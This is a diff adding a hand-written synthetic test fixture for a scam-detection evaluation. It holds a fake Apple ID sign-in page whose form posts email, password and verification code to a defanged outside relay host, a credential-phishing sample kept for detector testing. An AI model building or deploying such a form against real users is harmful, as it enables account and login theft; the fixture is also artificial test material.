@@ -1,0 +1,14 @@
+# Synthetic page fixture for ScamSentinel evaluation (P2b). Hand-written, not a real page.
+# Plain text on purpose: never rename it to .html or open it in a browser.
+url: hxxps://appleid-verify-account[.]com/signin
+status: 200
+---
+<html><head><title>Sign in to your Apple Account</title></head>
+<body>
+<form action="hxxps://id-verify-relay[.]net/a" method="post">
+  <input type="email" name="appleId" placeholder="Email or phone number">
+  <input type="password" name="password" placeholder="Password">
+  <input name="verification_code" placeholder="Verification code">
+  <button>Continue</button>
+</form>
+</body></html>
